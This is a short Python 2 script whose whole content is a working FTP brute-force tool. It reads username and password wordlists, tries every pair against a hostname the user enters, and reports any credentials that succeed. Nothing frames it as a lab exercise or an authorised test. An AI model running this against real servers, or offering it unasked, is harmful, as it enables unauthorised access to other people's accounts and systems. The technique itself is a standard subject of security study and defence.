#!/usr/bin/python
import ftplib

def bruteLogin(hostname,usernameFile,passwordFile):
	uF=open(usernameFile,'r')
	
	for u in uF.readlines():
		username=u.strip()
		pF=open(passwordFile,'r')
		for p in pF.readlines():
			password=p.strip()
			print '[+] Trying: '+username+"/"+password
			try:	
				ftp=ftplib.FTP(hostname)
				ftp.login(username,password)
				print '\n[*] '+str(hostname)+' FTP Logon Succeeded: '+username+"/"+password
				return (username,password)
			except Exception,e:
				print e
		pF.close()
	uF.close()
	print '\n[-] Could not brute force FTP credentials.'
	return (None,None)

def main():
	while True:
		h=raw_input("[*] Please enter the hostname: ")
		fu=raw_input("[*] Please enter the filenameof username: ")
		fp=raw_input("[*] Please enter the filename of password: ")
		bruteLogin(h,fu,fp)
		print

if __name__ == '__main__':
	main()
